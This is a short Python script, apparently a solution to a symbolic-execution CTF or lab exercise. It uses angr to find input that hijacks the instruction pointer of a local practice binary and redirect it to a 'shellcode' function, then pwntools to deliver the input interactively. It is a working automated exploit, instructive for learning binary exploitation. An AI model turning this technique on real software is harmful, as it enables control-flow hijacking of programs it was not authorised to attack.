from pwn import *
import angr

# smallest AEG

elf = ELF('./symexec_rip_level2')

print(hex(elf.symbols['shellcode']))
p = angr.Project('./symexec_rip_level2')

# 確保 hook 到 `angr.SIM_PROCEDURES` 使 symbolic execution 可解 
p.hook_symbol('strcmp', angr.SIM_PROCEDURES['libc']['strcmp']())
state = p.factory.entry_state()

# 為了找到 exploitable 必須啟用 `save_unconstrained=True`
sm = p.factory.simulation_manager(state, save_unconstrained=True)
sm.explore()

print(len(sm.unconstrained))

# https://github.com/angr/angr-doc/blob/master/examples/insomnihack_aeg/solve.py
def fully_symbolic(state, variable):
    '''
    check if a symbolic variable is completely symbolic
    '''

    for i in range(state.arch.bits):
        if not state.solver.symbolic(variable[i]):
            return False

    return True

# check rip is tainted
rip_state = None
for u in sm.unconstrained:
    if fully_symbolic(u, u.regs.pc):
        rip_state = u
        break

rip_state.add_constraints(rip_state.regs.pc == elf.symbols['shellcode'])
print(rip_state.posix.dumps(0))

# exploit
context.log_level ='debug'
c = process('./symexec_rip_level2')
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(c)
c.sendline(rip_state.posix.dumps(0))
c.interactive()
c.close()